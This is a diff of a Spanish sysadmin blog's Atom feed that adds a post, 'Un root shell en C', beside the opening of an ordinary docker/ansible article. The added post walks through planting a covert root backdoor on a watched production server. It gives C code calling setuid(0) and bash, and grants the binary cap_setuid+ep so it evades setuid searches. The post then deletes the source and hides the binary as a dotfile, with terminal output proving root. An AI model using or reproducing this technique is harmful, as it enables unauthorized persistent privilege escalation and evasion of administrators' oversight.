@@ -1,5 +1,78 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Linux Sysadmin</title><link href="http://www.linuxsysadmin.tk/" rel="alternate"></link><link href="http://www.linuxsysadmin.tk/feeds/operaciones.atom.xml" rel="self"></link><id>http://www.linuxsysadmin.tk/</id><updated>2016-06-06T08:00:00+02:00</updated><entry><title>Controlando contenedores docker con ansible</title><link href="http://www.linuxsysadmin.tk/2016/06/controlando-contenedores-docker-con-ansible.html" rel="alternate"></link><updated>2016-06-06T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.tk,2016-06-06:2016/06/controlando-contenedores-docker-con-ansible.html</id><summary type="html">&lt;p&gt;La facilidad de levantar un contenedor &lt;strong&gt;docker&lt;/strong&gt; nos lleva a la pregunta del millón: ¿es posible usar &lt;strong&gt;docker&lt;/strong&gt; para crear contenedores de usar y tirar para probar otras tecnologías? La respuesta es que sí, y para demostrarlo, vamos a generar un entorno minimalista en contenedores &lt;strong&gt;docker&lt;/strong&gt;, desplegados mediante &lt;strong&gt;ansible&lt;/strong&gt; &lt;em&gt;playbooks&lt;/em&gt;.&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Linux Sysadmin</title><link href="http://www.linuxsysadmin.tk/" rel="alternate"></link><link href="http://www.linuxsysadmin.tk/feeds/operaciones.atom.xml" rel="self"></link><id>http://www.linuxsysadmin.tk/</id><updated>2016-06-13T08:00:00+02:00</updated><entry><title>Un root shell en C</title><link href="http://www.linuxsysadmin.tk/2016/06/un-root-shell-en-c.html" rel="alternate"></link><updated>2016-06-13T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.tk,2016-06-13:2016/06/un-root-shell-en-c.html</id><summary type="html">&lt;p&gt;Cuando operamos un servidor de producción es habitual que no tengamos acceso habitual al usuario &lt;em&gt;root&lt;/em&gt;, e incluso lo tengan altamente vigilado. Podemos intentar dejar una puerta trasera, por ejemplo poniendo un binario con el &lt;em&gt;setuid&lt;/em&gt; bit activado, te pueden pillar. Sin embargo es posible dejar una puerta abierta oculta.&lt;/p&gt;
+&lt;p&gt;El truco esta en las &lt;em&gt;linux capabilities&lt;/em&gt;, que nos permiten dar permisos para operaciones concretas a binarios concretos; así pues, no es necesario ejecutar el binario con el usuario &lt;em&gt;root&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;El resto es tan fácil como hacer un binario que escale a &lt;em&gt;root&lt;/em&gt; y luego ejecute lo que necesitamos, por ejemplo, una línea de comandos &lt;strong&gt;bash&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Aquí ponemos el código fuente necesario para hacer lo que pretendemos.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;cat root_shell.c
+int main&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+    setuid&lt;span class="o"&gt;(&lt;/span&gt;0&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    system&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;bash&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="o"&gt;}&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;La compilación no tiene ningún misterio; lo compilamos con &lt;strong&gt;gcc&lt;/strong&gt; y le pasamos un &lt;strong&gt;strip&lt;/strong&gt; para reducir el tamaño al máximo.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;gcc -o root_shell root_shell.c
+&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;strip root_shell
+&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Si tratamos de ejecutarlo, veremos que la llamada para escalar a &lt;em&gt;root&lt;/em&gt; ha sido ignorada; el usuario que hemos usado no tiene permisos para hacer eso.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;./root_shell
+&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;id
+&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1002&lt;span class="o"&gt;(&lt;/span&gt;gerard&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1002&lt;span class="o"&gt;(&lt;/span&gt;gerard&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1002&lt;span class="o"&gt;(&lt;/span&gt;gerard&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;exit&lt;/span&gt;
+&lt;span class="nb"&gt;exit&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Vamos a darle la &lt;em&gt;capability&lt;/em&gt; &lt;strong&gt;CAP_SETUID&lt;/strong&gt;. Además, le pondremos los flags &lt;em&gt;effective&lt;/em&gt; y &lt;em&gt;permitted&lt;/em&gt;, que darán la &lt;em&gt;capability&lt;/em&gt; automáticamente y lo pasará a los procesos hijos. Mas información en &lt;a href="http://linux.die.net/man/7/capabilities"&gt;la documentación&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: he usado &lt;strong&gt;sudo&lt;/strong&gt; para hacer esta operación, pero como no tendremos esto en producción, tendremos que esperar una intervención en donde nos concedan ese permiso.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;sudo setcap cap_setuid+ep root_shell
+&lt;span class="o"&gt;[&lt;/span&gt;sudo&lt;span class="o"&gt;]&lt;/span&gt; password &lt;span class="k"&gt;for&lt;/span&gt; gerard:
+&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Ejecutando el binario, vemos que hemos obtenido lo que esperábamos; un binario que nos deja ante una línea de comandos con el usuario &lt;em&gt;root&lt;/em&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;./root_shell
+&lt;span class="o"&gt;[&lt;/span&gt;root@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# id&lt;/span&gt;
+&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1002&lt;span class="o"&gt;(&lt;/span&gt;gerard&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1002&lt;span class="o"&gt;(&lt;/span&gt;gerard&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;root@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# exit&lt;/span&gt;
+&lt;span class="nb"&gt;exit&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Podemos ver que no hay permisos especiales tipo &lt;em&gt;setuid&lt;/em&gt;, con lo que no pueden encontrarlo con el &lt;strong&gt;find&lt;/strong&gt; habitual.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;ls -lh
+total 12K
+-rwxrwxr-x. &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard 4.3K Mar &lt;span class="m"&gt;31&lt;/span&gt; 18:01 root_shell
+-rw-rw-r--. &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard   &lt;span class="m"&gt;50&lt;/span&gt; Mar &lt;span class="m"&gt;31&lt;/span&gt; 17:59 root_shell.c
+&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Vamos a intentar ocultar lo que nos delataría a simple vista; eliminamos el innecesario código fuente y ocultaremos el binario.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;rm root_shell.c
+&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;mv root_shell .hidden
+&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Comprobamos que sigue funcionando, y que tiene la &lt;em&gt;capability&lt;/em&gt; que le hemos dado.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;./.hidden
+&lt;span class="o"&gt;[&lt;/span&gt;root@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# id&lt;/span&gt;
+&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1002&lt;span class="o"&gt;(&lt;/span&gt;gerard&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1002&lt;span class="o"&gt;(&lt;/span&gt;gerard&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;root@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# exit&lt;/span&gt;
+&lt;span class="nb"&gt;exit&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;getpcaps .hidden
+Capabilities &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="sb"&gt;`&lt;/span&gt;.hidden&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;: &lt;span class="o"&gt;=&lt;/span&gt; cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+i
+&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;</summary><category term="linux"></category><category term="shell"></category><category term="root"></category><category term="capabilities"></category></entry><entry><title>Controlando contenedores docker con ansible</title><link href="http://www.linuxsysadmin.tk/2016/06/controlando-contenedores-docker-con-ansible.html" rel="alternate"></link><updated>2016-06-06T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.tk,2016-06-06:2016/06/controlando-contenedores-docker-con-ansible.html</id><summary type="html">&lt;p&gt;La facilidad de levantar un contenedor &lt;strong&gt;docker&lt;/strong&gt; nos lleva a la pregunta del millón: ¿es posible usar &lt;strong&gt;docker&lt;/strong&gt; para crear contenedores de usar y tirar para probar otras tecnologías? La respuesta es que sí, y para demostrarlo, vamos a generar un entorno minimalista en contenedores &lt;strong&gt;docker&lt;/strong&gt;, desplegados mediante &lt;strong&gt;ansible&lt;/strong&gt; &lt;em&gt;playbooks&lt;/em&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;AVISO&lt;/strong&gt;: De acuerdo con el autor de &lt;strong&gt;docker&lt;/strong&gt;, nunca deberíais poner &lt;strong&gt;SSH&lt;/strong&gt; en un contenedor &lt;strong&gt;docker&lt;/strong&gt; (artículo &lt;a href="https://jpetazzo.github.io/2014/06/23/docker-ssh-considered-evil/"&gt;aquí&lt;/a&gt;). Sin embargo, hoy vamos a hacer una excepción para esta demostración.&lt;/p&gt;
 &lt;h2&gt;Las imágenes base&lt;/h2&gt;
 &lt;p&gt;La idea es que vamos a levantar una serie de máquinas y vamos a dejar que &lt;strong&gt;ansible&lt;/strong&gt; las provisiones mediante &lt;em&gt;playbooks&lt;/em&gt;; para ello necesitamos una imagen base. También vamos a crear una imagen que solo sirva para ejecutar &lt;strong&gt;ansible&lt;/strong&gt;, que vamos a crear y a destruir según lo necesitemos.&lt;/p&gt;
